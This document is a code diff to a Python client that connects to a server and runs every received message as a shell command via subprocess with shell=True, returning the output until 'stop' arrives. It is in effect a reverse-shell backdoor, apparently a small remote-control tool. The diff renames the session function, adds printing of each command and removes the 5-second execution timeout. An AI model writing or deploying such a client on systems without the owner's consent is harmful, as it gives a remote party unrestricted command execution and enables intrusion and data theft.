@@ -12,7 +12,7 @@ STOP_WORD = "stop"
 def create_tcp_socket():
     return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-def create_session_client(socket_object, client_host, server_host, port):
+def create_session(socket_object, client_host, server_host, port):
     # Connect to the server
     socket_object.connect((server_host, port))
 
@@ -23,8 +23,9 @@ def create_session_client(socket_object, client_host, server_host, port):
 def execute_message(socket_object, message):
     # If the message exist, execute it.
     if message:
+        print(message)
         try:
-            result = subprocess.run(message, capture_output=True, text=True, shell=True, timeout = 5)
+            result = subprocess.run(message, capture_output=True, text=True, shell=True)
             return result
         except Exception as e:
             # Handle errors
@@ -45,7 +46,7 @@ def send_response(socket_object, result):
 def main():
     with create_tcp_socket() as s:
 
-        create_session_client(s, CLIENT_HOST, SERVER_HOST, PORT)
+        create_session(s, CLIENT_HOST, SERVER_HOST, PORT)
         
         # Running until "stop" is sent from the server.
         while True:
@@ -62,7 +63,7 @@ def main():
             send_response(s, result)
 
 
-print("Done")
+    print("Done")
 
 if __name__ == "__main__":
     main()
